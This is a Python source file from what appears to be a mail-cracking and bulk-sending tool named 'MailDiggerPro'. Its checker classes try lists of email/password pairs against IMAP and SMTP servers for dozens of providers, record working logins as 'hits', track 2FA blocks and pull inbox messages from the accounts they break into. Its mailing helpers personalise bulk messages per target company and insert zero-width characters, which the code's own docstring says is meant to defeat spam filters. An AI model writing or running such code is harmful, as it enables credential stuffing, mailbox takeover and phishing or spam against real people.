from pathlib import Path
import imaplib
import poplib
import smtplib
import socket
import ssl
import threading
import time
import os
import json
import re
import sqlite3
import requests # pyre-ignore[fd3016d7-22b5-4914-a5d7-aefd84364b92]
import webbrowser
import asyncio
from aiosmtplib import SMTP as AsyncSMTP, SMTPException
import urllib.parse
import datetime
import uvicorn # pyre-ignore[c476623c-fd62-4b47-9f3c-49e34dc2026c]
import logging
import random
import string as s
import aiosmtplib # pyre-ignore[1ca60f03-cf03-41e8-8b1e-dc551f14e317]
import hashlib
import base64
import os
import subprocess
try:
    from Crypto.Cipher import AES
except ImportError:
    AES = None

from .bot import ACCOUNTS

def _derive_key_iv(key_str: str):
    """Derive AES-256-CBC key and IV from the provided key string, mirroring the PHP implementation.
    The key is SHA‑256 of the key string; the IV is the first 16 bytes of the same hash.
    """
    key = hashlib.sha256(key_str.encode()).digest()
    iv = hashlib.sha256(key_str.encode()).digest()[:16]
    return key, iv

def encrypt_data(data: str, key_str: str) -> str:
    """Encrypt a string using AES‑256‑CBC and return a base64‑encoded ciphertext.
    Matches the behaviour of `encryptData` in WAF/includes/encryption.php.
    """
    if not data:
        return ""
    if AES is None:
        raise RuntimeError("PyCryptodome is not available for encryption")
    key, iv = _derive_key_iv(key_str)
    # PKCS7 padding
    pad_len = 16 - (len(data.encode('utf-8')) % 16)
    padding = chr(pad_len) * pad_len
    padded_data = data + padding
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted_bytes = cipher.encrypt(padded_data.encode('utf-8'))
    return base64.b64encode(encrypted_bytes).decode('utf-8')

def decrypt_data(data: str, key_str: str) -> str:
    """Decrypt a base64‑encoded AES‑256‑CBC ciphertext back to plaintext.
    Reverses the operation of encrypt_data / encryptData in encryption.php.
    Returns the original plaintext, or the raw input if decryption fails.
    """
    if not data:
        return ""
    if AES is None:
        return data  # Cannot decrypt without PyCryptodome; return as-is
    try:
        key, iv = _derive_key_iv(key_str)
        encrypted_bytes = base64.b64decode(data)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted_padded = cipher.decrypt(encrypted_bytes)
        # Remove PKCS7 padding
        pad_len = decrypted_padded[-1]
        return decrypted_padded[:-pad_len].decode('utf-8')
    except Exception:
        return data  # Return original if decryption fails (not encrypted)

def obfuscate_html(html: str) -> str:
    """Inject random HTML comments ONLY into text nodes (never inside tags/CSS/JS).
    This breaks spam-filter phrase-matching while keeping the HTML perfectly valid
    so all email clients (Gmail, Outlook, temp-mail, etc.) render it normally.
    """
    import random as _r, string as _s
    def _junk(): return '<!--' + ''.join(_r.choices(_s.ascii_letters + _s.digits, k=7)) + '-->'
    
    # Hide <style>, <script>, and <svg> blocks so we don't inject inside them
    hidden = {}
    def hide(m):
        k = f"__HIDDEN_{len(hidden)}__"
        hidden[k] = m.group(0)
        return k
    
    html = re.sub(r'(?is)<(script|style|svg).*?>.*?</\1>', hide, html)
    hidden_keys = set(hidden.keys())
    _placeholder_re = re.compile(r'(__HIDDEN_\d+__)')

    def _obfuscate_text(text: str) -> str:
        # A text node may contain several placeholders back-to-back; obfuscate around them only.
        parts = _placeholder_re.split(text)
        out = []
        for part in parts:
            if part in hidden_keys:
                out.append(part)
            elif part:
                out.append(re.sub(r'(\w{4,})', lambda w: '\u200c'.join(list(w.group(0))), part))
        return ''.join(out)

    result = []
    last = 0
    for m in re.finditer(r'<[^>]+>', html):           # walk over every HTML tag
        text_node = html[last:m.start()]               # text between previous tag end and this tag start
        if text_node.strip():                          # only touch non-empty text nodes
            result.append(_obfuscate_text(text_node))
        else:
            result.append(text_node)
        result.append(m.group(0))                      # keep the tag byte-perfect
        last = m.end()
    tail = html[last:]                                 # text after the final tag
    if tail.strip():
        result.append(_obfuscate_text(tail))
    else:
        result.append(tail)
        
    html = ''.join(result)
    # Restore hidden tags
    for k, v in hidden.items():
        html = html.replace(k, v)
    return html

def _svg_to_email_img(html: str) -> str:
    """Gmail/Outlook often drop inline <svg>; embed each SVG as a base64 <img> instead."""
    import base64

    def repl(m):
        svg = m.group(0)
        b64 = base64.b64encode(svg.encode('utf-8')).decode('ascii')
        cls_m = re.search(r'class="([^"]*)"', svg)
        cls = cls_m.group(1) if cls_m else ''
        if 'emblem' in cls:
            w, h = '70', '70'
        else:
            w, h = '18', '18'
        return (
            f'<img src="data:image/svg+xml;base64,{b64}" alt="" width="{w}" height="{h}" '
            f'style="width:{w}px;height:{h}px;display:inline-block;vertical-align:middle;" />'
        )

    return re.sub(r'(?is)<svg\b[^>]*>.*?</svg>', repl, html)

def prepare_html_for_email(html: str) -> str:
    """Normalize HTML before SMTP send: drop scripts, obfuscate text, fix SVG for clients."""
    html = re.sub(r'(?is)<script\b[^>]*>.*?</script>', '', html)
    html = obfuscate_html(html)
    html = _svg_to_email_img(html)
    return html

def parse_email_targets(raw_targets) -> list:
    """Split recipient lists from newlines, commas, or semicolons."""
    targets = []
    for item in raw_targets or []:
        for part in re.split(r'[,;\s]+', str(item).strip()):
            addr = part.strip().strip(',;')
            if addr and '@' in addr:
                targets.append(addr)
    return list(dict.fromkeys(targets))

def parse_email_company_pairs(raw_targets, raw_companies=None) -> list:
    """
    Parse recipient email, company, and subject.
    Supports:
    1) Tab-separated/Excel or space-separated format: `email  company  subject` or `email\tcompany\tsubject`
    2) Delimited format: `email:company:subject` or `email|company|subject`
    3) Separate lists for emails, companies, and subjects
    """
    if isinstance(raw_targets, str):
        target_lines = [line.strip() for line in raw_targets.splitlines() if line.strip()]
    elif isinstance(raw_targets, list):
        target_lines = []
        for item in raw_targets:
            for line in str(item).splitlines():
                if line.strip():
                    target_lines.append(line.strip())
    else:
        target_lines = []

    companies_list = []
    if raw_companies:
        if isinstance(raw_companies, str):
            companies_list = [c.strip() for c in raw_companies.splitlines() if c.strip()]
        elif isinstance(raw_companies, list):
            for c in raw_companies:
                for line in str(c).splitlines():
                    if line.strip():
                        companies_list.append(line.strip())

    pairs = []

    for idx, line in enumerate(target_lines):
        sublines = re.split(r'[\r\n]+', line)
        for sline in sublines:
            sline = sline.strip()
            if not sline:
                continue
            
            email = ""
            company = ""
            subject = ""

            # Check 1: Tab-separated or 2+ spaces (Excel column copy-paste)
            parts = re.split(r'\t|\s{2,}', sline)
            parts = [p.strip() for p in parts if p.strip()]
            
            if len(parts) >= 3 and '@' in parts[0]:
                email = parts[0]
                company = parts[1]
                subject = parts[2]
            elif len(parts) == 2 and '@' in parts[0]:
                email = parts[0]
                company = parts[1]
            elif len(parts) == 1 and '@' in parts[0]:
                email = parts[0]
            else:
                match_delim3 = re.search(r'^([^\s:,;|\t]+@[^\s:,;|\t]+\.[^\s:,;|\t]+)\s*[:|;]\s*([^:|;]+)\s*[:|;]\s*(.+)$', sline)
                match_delim2 = re.search(r'^([^\s:,;|\t]+@[^\s:,;|\t]+\.[^\s:,;|\t]+)\s*[:|;]\s*(.+)$', sline)
                
                if match_delim3:
                    email = match_delim3.group(1).strip()
                    company = match_delim3.group(2).strip()
                    subject = match_delim3.group(3).strip()
                elif match_delim2:
                    email = match_delim2.group(1).strip()
                    company = match_delim2.group(2).strip()
                else:
                    email_match = re.search(r'([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)', sline)
                    if email_match:
                        email = email_match.group(1).strip()
                        rest = sline.replace(email, "").strip()
                        if rest:
                            company = re.sub(r'^[:|,;\s\t]+', '', rest).strip()
                        else:
                            if idx < len(companies_list):
                                company = companies_list[idx]

            if email and not company:
                if idx < len(companies_list):
                    company = companies_list[idx]

            if email:
                pairs.append({
                    "email": email,
                    "company": company,
                    "subject": subject
                })

    return pairs

def replace_dynamic_tags(text: str, email: str, company: str) -> str:
    """Replace dynamic placeholders like {company}, [company], {email}, {domain}."""
    if not text:
        return ""
    domain = email.split('@')[-1] if '@' in email else ""
    tags = {
        '{company}': company,
        '{Company}': company,
        '{COMPANY}': company.upper() if company else "",
        '[company]': company,
        '[Company]': company,
        '[COMPANY]': company.upper() if company else "",
        '{company_name}': company,
        '[company_name]': company,
        '{email}': email,
        '[email]': email,
        '{domain}': domain,
        '[domain]': domain
    }
    for tag, val in tags.items():
        text = text.replace(tag, val)
    return text


def html_to_plain(html: str) -> str:
    """Convert HTML to plain text fallback by stripping tags and completely removing CSS/JS."""
    text = re.sub(r'(?is)<(script|style).*?>.*?</\1>', '', html)
    text = re.sub(r'<[^>]+>', '', text)
    text = text.replace('&nbsp;', ' ').replace('&amp;', '&').replace('&gt;', '>').replace('&lt;', '<')
    return '\n'.join(line.strip() for line in text.split('\n') if line.strip())

from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from email.utils import formatdate, make_msgid, formataddr
from dns import resolver # pyre-ignore[09005e78-c4d8-4191-9ef2-44cbce1f9c5c]
import dns.resolver # pyre-ignore[5c18690a-8490-421f-887c-4f9a64902447]
import typing
from concurrent.futures import ThreadPoolExecutor
from fastapi import FastAPI, WebSocket, Request, BackgroundTasks # pyre-ignore[a78d055d-b385-40b6-8a8b-ad3c86609d19]
from fastapi.responses import HTMLResponse, JSONResponse, FileResponse # pyre-ignore[fad9c3b7-5d82-411c-bc96-2b1f113d2562]
from email.header import decode_header, Header
from email import message_from_bytes
from typing import List, Dict, Any, Union
from contextlib import asynccontextmanager
try:
    from playwright.async_api import async_playwright
    from playwright_stealth import Stealth
except ImportError:
    async_playwright = None # type: ignore
    Stealth = None # type: ignore

# Check for extra dependencies for new check functions
try:
    from requests_html import AsyncHTMLSession # pyre-ignore[f602693a-497f-4196-a043-c18e5dbfd945]
except ImportError:
    AsyncHTMLSession = None

try:
    import socks # pyre-ignore[missing-module-attribute]
except ImportError:
    socks = None # pyre-ignore[assignment]

# --- LOGGING ---
logging.basicConfig(level=logging.ERROR)
logger = logging.getLogger("MailDiggerPro")

# --- UTILITIES ---
uaLst = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
]

def randstr(length=20):
    return ''.join(random.choices(s.ascii_letters + s.digits, k=length))


# --- CONFIGURATION ---
SIGNATURE = "@Hamzatostospospos"
DB_PATH = 'mail_settings.db'; VALID_PATH = 'Valid.txt'
HITS_FOLDER = 'Hits_by_Keyword'; COOKIES_FOLDER = 'cookies'
SENT_LOG_FILE = 'sent_emails.log'

# ============================================
# ENHANCED CLASSES & FUNCTIONS (v12.2 OMEGA+)
# ============================================

class MailAccessChecker:
    """Advanced mail access verification with multiple methods"""
    
    @staticmethod
    def check_imap_access(email: str, password: str, domain: str = None) -> Dict[str, Any]:
        """Check IMAP access with multiple ports and security protocols with retries"""
        if not domain:
            domain = email.split('@')[1]
        
        result = {
            "email": email,
            "method": "IMAP",
            "accessible": False,
            "servers_tried": [],
            "details": {},
            "error": "No servers reached"
        }
        
        servers = KNOWN_IMAP_SERVERS.get(domain, [("imap." + domain, 993)])
        
        for server, port in servers:
            result["servers_tried"].append(f"{server}:{port}")
            
            def _attempt_login():
                imap_conn = imaplib.IMAP4_SSL(server, port, ssl_context=ctx, timeout=state.timeout)
                imap_conn.login(email, password)
                imap_conn.select('INBOX', readonly=True)
                return imap_conn

            try:
                imap_conn = safe_execute_with_retry(_attempt_login)
                result["accessible"] = True
                result["details"] = {
                    "server": server,
                    "port": port,
                    "capabilities": str(imap_conn.capabilities())
                }
                result["error"] = None
                imap_conn.logout()
                break
            except imaplib.IMAP4.error as e:
                err_str = str(e).lower()
                result["error"] = f"Login Failed: {str(e)}"
                if "web login required" in err_str or "second factor required" in err_str or "challenge required" in err_str or "application-specific password required" in err_str or "app-specific password" in err_str:
                    with state.lock: state.two_factor += 1
            except socket.timeout:
                result["error"] = "Connection Timeout"
            except Exception as e:
                err_str = str(e).lower()
                result["error"] = str(e)
                if "web login required" in err_str or "second factor required" in err_str or "challenge required" in err_str or "application-specific password required" in err_str:
                    with state.lock: state.two_factor += 1
        
        return result
    
    @staticmethod
    def check_smtp_access(email: str, password: str, domain: str = None) -> Dict[str, Any]:
        """Check SMTP access with multiple configurations and retries"""
        if not domain:
            domain = email.split('@')[1]
        
        result = {
            "email": email,
            "method": "SMTP",
            "accessible": False,
            "servers_tried": [],
            "details": {},
            "error": "No servers reached"
        }
        
        config = SMTP_CONFIGS.get(domain, {})
        servers = config.get("servers", [("smtp." + domain, 587, "TLS")])
        
        for server, port, security in servers:
            result["servers_tried"].append(f"{server}:{port} ({security})")
            
            def _attempt_smtp():
                if security == "SSL":
                    smtp_conn = smtplib.SMTP_SSL(server, port, context=ctx, timeout=state.timeout)
                else:
                    smtp_conn = smtplib.SMTP(server, port, timeout=state.timeout)
                    smtp_conn.starttls(context=ctx)
                
                smtp_conn.login(email, password)
                return smtp_conn

            try:
                smtp_conn = safe_execute_with_retry(_attempt_smtp)
                result["accessible"] = True
                result["details"] = {
                    "server": server,
                    "port": port,
                    "security": security
                }
                result["error"] = None
                smtp_conn.quit()
                break
            except smtplib.SMTPAuthenticationError:
                result["error"] = "Authentication Failed"
            except socket.timeout:
                result["error"] = "Connection Timeout"
            except Exception as e:
                result["error"] = str(e)
        
        return result
    
    @staticmethod
    def check_inbox_access(email: str, password: str) -> Dict[str, Any]:
        """Check inbox read access and return full extraction (headers, body, attachments)"""
        result = {
            "email": email,
            "can_read_inbox": False,
            "message_count": 0,
            "messages": [],
            "error": None
        }
        
        domain = email.split('@')[1]
        imap_check = MailAccessChecker.check_imap_access(email, password, domain)
        
        if imap_check["accessible"]:
            try:
                server = imap_check["details"]["server"]
                port = imap_check["details"]["port"]
                
                def _do_fetch():
                    imap_conn = imaplib.IMAP4_SSL(server, port, ssl_context=ctx, timeout=state.timeout)
                    imap_conn.login(email, password)
                    return imap_conn

                imap_conn = safe_execute_with_retry(_do_fetch)
                
                status, mailboxes = imap_conn.list()
                result["mailboxes"] = [m.decode('utf-8') if isinstance(m, bytes) else m for m in mailboxes]
                
                status, count = imap_conn.select('INBOX')
                if status == 'OK':
                    result["can_read_inbox"] = True
                    result["message_count"] = int(count[0])
                    
                    # Fetch last 5 messages with full extraction
                    if result["message_count"] > 0:
                        fetch_limit = min(5, result["message_count"])
                        status, data = imap_conn.search(None, 'ALL')
                        ids = data[0].split()
                        for msg_id in ids[-fetch_limit:]:
                            res, msg_data = imap_conn.fetch(msg_id, '(RFC822)')
                            msg = message_from_bytes(msg_data[0][1])
                            
                            # Extract body
                            body = ""
                            html = ""
                            attachments = []
                            if msg.is_multipart():
                                for part in msg.walk():
                                    ctype = part.get_content_type()
                                    cdisp = str(part.get('Content-Disposition'))
                                    if ctype == 'text/plain' and 'attachment' not in cdisp:
                                        body += part.get_payload(decode=True).decode('utf-8', errors='ignore')
                                    elif ctype == 'text/html' and 'attachment' not in cdisp:
                                        html += part.get_payload(decode=True).decode('utf-8', errors='ignore')
                                    elif 'attachment' in cdisp:
                                        attachments.append(part.get_filename())
                            else:
                                body = msg.get_payload(decode=True).decode('utf-8', errors='ignore')
                                
                            result["messages"].append({
                                "id": msg_id.decode(),
                                "from": clean_s(msg.get('From')),
                                "sub": clean_s(msg.get('Subject')),
                                "date": clean_s(msg.get('Date')),
                                "body": body[:500] + "..." if len(body) > 500 else body,
                                "has_html": bool(html),
                                "attachments": attachments
                            })
                
                imap_conn.logout()
            except Exception as e:
                result["error"] = str(e)
        else:
            result["error"] = imap_check.get("error", "Access failed")
        
        return result

class ComcastMailChecker:
    """Specialized checker for Comcast email accounts"""
    
    @staticmethod
    def check_imap(email: str, password: str) -> Dict[str, Any]:
        """Check Comcast IMAP access (imap.comcast.net:993)"""
        result = {
            "email": email,
            "provider": "Comcast",
            "method": "IMAP",
            "accessible": False,
            "server": "imap.comcast.net",
            "port": 993
        }
        
        try:
            imap_conn = imaplib.IMAP4_SSL("imap.comcast.net", 993, ssl_context=ctx, timeout=15)
            imap_conn.login(email, password)
            
            status, mailboxes = imap_conn.list()
            result["accessible"] = True
            result["mailboxes"] = [m.decode('utf-8') if isinstance(m, bytes) else m for m in mailboxes]
            
            imap_conn.logout()
        except:
            result["error"] = "Invalid credentials or connection failed"
        
        return result
    
    @staticmethod
    def check_smtp(email: str, password: str) -> Dict[str, Any]:
        """Check Comcast SMTP access (smtp.comcast.net:587 or 465)"""
        result = {
            "email": email,
            "provider": "Comcast",
            "method": "SMTP",
            "accessible": False,
            "servers_tested": []
        }
        
        for port, security in [(587, "TLS"), (465, "SSL")]:
            try:
                result["servers_tested"].append(f"smtp.comcast.net:{port} ({security})")
                
                if security == "SSL":
                    smtp_conn = smtplib.SMTP_SSL("smtp.comcast.net", port, context=ctx, timeout=15)
                else:
                    smtp_conn = smtplib.SMTP("smtp.comcast.net", port, timeout=15)
                    smtp_conn.starttls(context=ctx)
                
                smtp_conn.login(email, password)
                result["accessible"] = True
                result["server"] = "smtp.comcast.net"
                result["port"] = port
                result["security"] = security
                smtp_conn.quit()
                break
            except:
                result["error"] = "Connection failed"
        
        return result
    
    @staticmethod
    def full_check(email: str, password: str) -> Dict[str, Any]:
        """Full Comcast account check (IMAP + SMTP)"""
        return {
            "email": email,
            "provider": "Comcast",
            "imap_check": ComcastMailChecker.check_imap(email, password),
            "smtp_check": ComcastMailChecker.check_smtp(email, password),
            "timestamp": datetime.datetime.now().isoformat()
        }

class OfficeMailChecker:
    """Specialized checker for Office365/Outlook accounts"""
    
    @staticmethod
    def check_imap(email: str, password: str) -> Dict[str, Any]:
        """Check Office365 IMAP access"""
        result = {
            "email": email,
            "provider": "Office365",
            "method": "IMAP",
            "accessible": False,
            "servers_tested": []
        }
        
        servers = [
            ("outlook.office365.com", 993),
            ("imap-mail.outlook.com", 993),
            ("smtp.office365.com", 993)
        ]
        
        for server, port in servers:
            result["servers_tested"].append(f"{server}:{port}")
            try:
                imap_conn = imaplib.IMAP4_SSL(server, port, ssl_context=ctx, timeout=15)
                imap_conn.login(email, password)
                result["accessible"] = True
                result["server"] = server
                result["port"] = port
                imap_conn.logout()
                break
            except:
                result["error"] = "Connection failed"
        
        return result
    
    @staticmethod
    def check_smtp(email: str, password: str) -> Dict[str, Any]:
        """Check Office365 SMTP access"""
        result = {
            "email": email,
            "provider": "Office365",
            "method": "SMTP",
            "accessible": False,
            "servers_tested": []
        }
        
        servers = [
            ("smtp.office365.com", 587),
            ("smtp-mail.outlook.com", 587),
            ("smtp.office365.com", 465)
        ]
        
        for server, port in servers:
            result["servers_tested"].append(f"{server}:{port}")
            try:
                smtp_conn = smtplib.SMTP(server, port, timeout=15)
                smtp_conn.starttls(context=ctx)
                smtp_conn.login(email, password)
                result["accessible"] = True
                result["server"] = server
                result["port"] = port
                smtp_conn.quit()
                break
            except:
                result["error"] = "Connection failed"
        
        return result

class GmailMailChecker:
    """Specialized checker for Gmail accounts (No WebAuth/OAuth required)"""
    
    @staticmethod
    def check_imap(email: str, password: str) -> Dict[str, Any]:
        """Check Gmail IMAP access (imap.gmail.com:993)"""
        result = {
            "email": email,
            "provider": "Gmail",
            "method": "IMAP",
            "accessible": False,
            "server": "imap.gmail.com",
            "port": 993
        }
        
        try:
            imap_conn = imaplib.IMAP4_SSL("imap.gmail.com", 993, ssl_context=ctx, timeout=15)
            imap_conn.login(email, password)
            
            status, mailboxes = imap_conn.list()
            result["accessible"] = True
            result["mailboxes"] = [m.decode('utf-8') if isinstance(m, bytes) else m for m in mailboxes]
            
            imap_conn.logout()
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    @staticmethod
    def check_smtp(email: str, password: str) -> Dict[str, Any]:
        """Check Gmail SMTP access (smtp.gmail.com:587 or 465)"""
        result = {
            "email": email,
            "provider": "Gmail",
            "method": "SMTP",
            "accessible": False,
            "servers_tested": []
        }
        
        for port, security in [(587, "TLS"), (465, "SSL")]:
            try:
                result["servers_tested"].append(f"smtp.gmail.com:{port} ({security})")
                
                if security == "SSL":
                    smtp_conn = smtplib.SMTP_SSL("smtp.gmail.com", port, context=ctx, timeout=15)
                else:
                    smtp_conn = smtplib.SMTP("smtp.gmail.com", port, timeout=15)
                    smtp_conn.starttls(context=ctx)
                
                smtp_conn.login(email, password)
                result["accessible"] = True
                result["server"] = "smtp.gmail.com"
                result["port"] = port
                result["security"] = security
                smtp_conn.quit()
                break
            except Exception as e:
                result["error"] = str(e)
        
        return result
    
    @staticmethod
    def full_check(email: str, password: str) -> Dict[str, Any]:
        """Full Gmail account check (IMAP + SMTP)"""
        return {
            "email": email,
            "provider": "Gmail",
            "imap_check": GmailMailChecker.check_imap(email, password),
            "smtp_check": GmailMailChecker.check_smtp(email, password),
            "timestamp": datetime.datetime.now().isoformat()
        }

def log_sent_email(sender: str, recipient: str, subject: str, body: str, 
                   status: str, server: str, port: int):
    """Log sent email to database and file"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("""INSERT INTO sent_emails 
                     (sender, recipient, subject, body, sent_time, delivery_status, server, port) 
                     VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
                   (sender, recipient, subject, body, datetime.datetime.now().isoformat(), status, server, port))
    conn.commit()
    conn.close()
    
    # Also log to file
    with open(SENT_LOG_FILE, 'a') as f:
        f.write(f"[{datetime.datetime.now().isoformat()}] FROM: {sender} TO: {recipient} | "
                f"SERVER: {server}:{port} | STATUS: {status}\n")

# Relaxed SSL for custom domains
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

for folder in [HITS_FOLDER, COOKIES_FOLDER]:
    if not os.path.exists(folder): os.makedirs(folder)

def clean_s(s: Any) -> str:
    if s is None: return ""
    s = str(s)
    try:
        parts = decode_header(s)
        decoded = ""
        for part, enc in parts:
            if isinstance(part, bytes):
                try:
                    encoding = enc if enc and str(enc).lower() not in ('unknown-8bit', 'unknown') else 'utf-8'
                    decoded += part.decode(encoding, errors='ignore')
                except (LookupError, UnicodeDecodeError):
                    decoded += part.decode('utf-8', errors='ignore')
            else:
                decoded += str(part)
        s = decoded
    except Exception:
        pass
    return s.replace('\u0000','').strip()

def format_header_subject(subj_str: str) -> str:
    """Formats and encodes subject strings safely for SMTP MIME headers, handling unicode, borders, newlines, and spintax."""
    if not subj_str:
        return ""
    subj_str = str(subj_str).replace('\r\n', '\n').replace('\r', '\n')
    # If raw HTML tags like <div style="..."> are in subject, clean raw HTML tags
    if re.search(r'<(div|span|p|b|i|style|html|body|table|tr|td|font)[^>]*>', subj_str, re.IGNORECASE):
        subj_str = re.sub(r'<[^>]+>', '', subj_str).strip()
    try:
        subj_str.encode('ascii')
        if '\n' in subj_str:
            folded = '\n '.join(subj_str.split('\n'))
            return Header(folded, 'ascii').encode()
        return subj_str
    except UnicodeEncodeError:
        if '\n' in subj_str:
            lines = [Header(l, 'utf-8').encode() for l in subj_str.split('\n') if l]
            return '\n '.join(lines)
        return Header(subj_str, 'utf-8').encode()

# --- DATABASE / PROVIDERS ---
def init_db():
    conn = sqlite3.connect(DB_PATH); cursor = conn.cursor()
    cursor.execute("CREATE TABLE IF NOT EXISTS providers (domain TEXT PRIMARY KEY, imap_host TEXT, imap_port INTEGER, pop_host TEXT, pop_port INTEGER, smtp_host TEXT, smtp_port INTEGER)")
    cursor.execute("CREATE TABLE IF NOT EXISTS hits_history (user TEXT, pass TEXT, srv TEXT, proto TEXT, time TEXT, UNIQUE(user, pass))")
    cursor.execute("CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)")
    
    # Default settings
    default_settings = [
        ('max_retries', '3'),
        ('retry_delay', '2'),
        ('timeout', '15')
    ]
    for key, val in default_settings:
        cursor.execute("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)", (key, val))
    
    conn.commit(); conn.close()

def get_provider(domain: str):
    conn = sqlite3.connect(DB_PATH); cursor = conn.cursor()
    cursor.execute("SELECT imap_host, imap_port, pop_host, pop_port, smtp_host, smtp_port FROM providers WHERE domain=?", (domain.lower(),))
    res = cursor.fetchone(); conn.close()
    return res

def save_provider(domain: str, ih: str, ip: int, ph: str, pp: int, sh: str, sp: int):
    conn = sqlite3.connect(DB_PATH); cursor = conn.cursor()
    cursor.execute("INSERT OR REPLACE INTO providers (domain, imap_host, imap_port, pop_host, pop_port, smtp_host, smtp_port) VALUES (?, ?, ?, ?, ?, ?, ?)", (domain.lower(), ih, ip, ph, pp, sh, sp))
    conn.commit(); conn.close()

MICROSOFT = ["office365", "outlook", "hotmail", "live"]
GMAIL = ["gmail", "googlemail"]

# --- KNOWN IMAP SERVERS (shared by discover_server and check_imap_access) ---
KNOWN_IMAP_SERVERS = {
    "gmail.com": [("imap.gmail.com", 993), ("imap.gmail.com", 587)],
    "googlemail.com": [("imap.gmail.com", 993)],
    "outlook.com": [("outlook.office365.com", 993), ("imap-mail.outlook.com", 993)],
    "hotmail.com": [("outlook.office365.com", 993), ("imap-mail.outlook.com", 993)],
    "live.com": [("outlook.office365.com", 993)],
    "yahoo.com": [("imap.mail.yahoo.com", 993), ("imap.yahoo.com", 993)],
    "ymail.com": [("imap.mail.yahoo.com", 993)],
    "aol.com": [("imap.aol.com", 993)],
    "comcast.net": [("imap.comcast.net", 993)],
    "comcast.com": [("imap.comcast.net", 993)],
    "xfinity.com": [("imap.comcast.net", 993)],
    "att.net": [("imap.mail.att.net", 993)],
    "sbcglobal.net": [("imap.mail.att.net", 993)],
    "bellsouth.net": [("imap.mail.att.net", 993)],
    "charter.net": [("mobile.charter.net", 993)],
    "spectrum.net": [("mobile.charter.net", 993)],
    "cox.net": [("imap.cox.net", 993)],
    "centurylink.net": [("imap.centurylink.net", 993)],
    "optonline.net": [("mail.optonline.net", 993)],
    "earthlink.net": [("imap.earthlink.net", 993)],
    "netzero.net": [("imap.netzero.net", 993)],
    "mail.ru": [("imap.mail.ru", 993)],
    "bk.ru": [("imap.mail.ru", 993)],
    "list.ru": [("imap.mail.ru", 993)],
    "inbox.ru": [("imap.mail.ru", 993)],
    "yandex.ru": [("imap.yandex.ru", 993)],
    "rambler.ru": [("imap.rambler.ru", 993)],
    "proton.me": [("imap.protonmail.com", 993)],
    "protonmail.com": [("imap.protonmail.com", 993)],
    "zoho.com": [("imap.zoho.com", 993)],
    "libero.it": [("imapmail.libero.it", 993)],
    "virgilio.it": [("in.virgilio.it", 993)],
    "alice.it": [("in.alice.it", 143)],
    "tiscali.it": [("imap.tiscali.it", 993)],
    "laposte.net": [("imap.laposte.net", 993)],
    "bol.com.br": [("imap.bol.com.br", 993)],
    "uol.com.br": [("imap.uol.com.br", 993)],
    "terra.com.br": [("imap.terra.com.br", 993)],
    "mynet.com": [("imap.mynet.com", 993)],
    "onet.pl": [("imap.poczta.onet.pl", 993)],
    "wp.pl": [("imap.wp.pl", 993)],
    "seznam.cz": [("imap.seznam.cz", 993)],
    "email.cz": [("imap.seznam.cz", 993)],
    "post.cz": [("imap.seznam.cz", 993)],
    "gmx.de": [("imap.gmx.net", 993)],
    "gmx.net": [("imap.gmx.net", 993)],
    "gmx.at": [("imap.gmx.net", 993)],
    "web.de": [("imap.web.de", 993)],
    "freenet.de": [("mx.freenet.de", 993)],
    "t-online.de": [("secureimap.t-online.de", 993)],
    "arcor.de": [("imap.arcor.de", 993)],
    "posteo.de": [("posteo.de", 993)],
    "mailbox.org": [("imap.mailbox.org", 993)],
    "vodafone.de": [("imap.vodafone.de", 993)],
    "free.fr": [("imap.free.fr", 993)],
    "orange.fr": [("imap.orange.fr", 993)],
    "sfr.fr": [("imap.sfr.fr", 993)],
    "btinternet.com": [("mail.btinternet.com", 993)],
    "sky.com": [("imap.tools.sky.com", 993)],
    "talktalk.net": [("imap.talktalk.net", 993)],
    "bell.net": [("imaphm.sympatico.ca", 993)],
    "sympatico.ca": [("imaphm.sympatico.ca", 993)],
    "cogeco.ca": [("imap.cogeco.ca", 993)],
    "videotron.ca": [("imap.videotron.ca", 993)],
    "shaw.ca": [("imap.shaw.ca", 993)],
    "telus.net": [("imap.telus.net", 993)],
    "rogers.com": [("imap.mail.yahoo.com", 993)],
    "telenet.be": [("imap.telenet.be", 993)],
    "bluewin.ch": [("imaps.bluewin.ch", 993)],
    "walla.co.il": [("imap.walla.co.il", 993)],
    "walla.com": [("imap.walla.co.il", 993)],
    "bezeqint.net": [("imap.bezeqint.net", 993)],
    "o2.pl": [("poczta.o2.pl", 993)],
    "rediffmail.com": [("imap.rediffmail.com", 993)],
    "centrum.cz": [("imap.centrum.cz", 993)],
    "eircom.net": [("imap.eircom.net", 993)],
}

SMTP_CONFIGS = {
    "hotmail.com": {"servers": [("smtp.office365.com", 587, "TLS"), ("smtp-mail.outlook.com", 587, "TLS"), ("smtp.office365.com", 465, "SSL")], "type": "Microsoft", "limit": 300},
    "outlook.com": {"servers": [("smtp.office365.com", 587, "TLS"), ("smtp-mail.outlook.com", 587, "TLS"), ("smtp.office365.com", 465, "SSL")], "type": "Microsoft", "limit": 300},
    "live.com": {"servers": [("smtp.office365.com", 587, "TLS"), ("smtp-mail.outlook.com", 587, "TLS"), ("smtp.office365.com", 465, "SSL")], "type": "Microsoft", "limit": 300},
    "office365.com": {"servers": [("smtp.office365.com", 587, "TLS"), ("smtp.office365.com", 465, "SSL"), ("smtp-mail.outlook.com", 587, "TLS")], "type": "Microsoft", "limit": 1000},
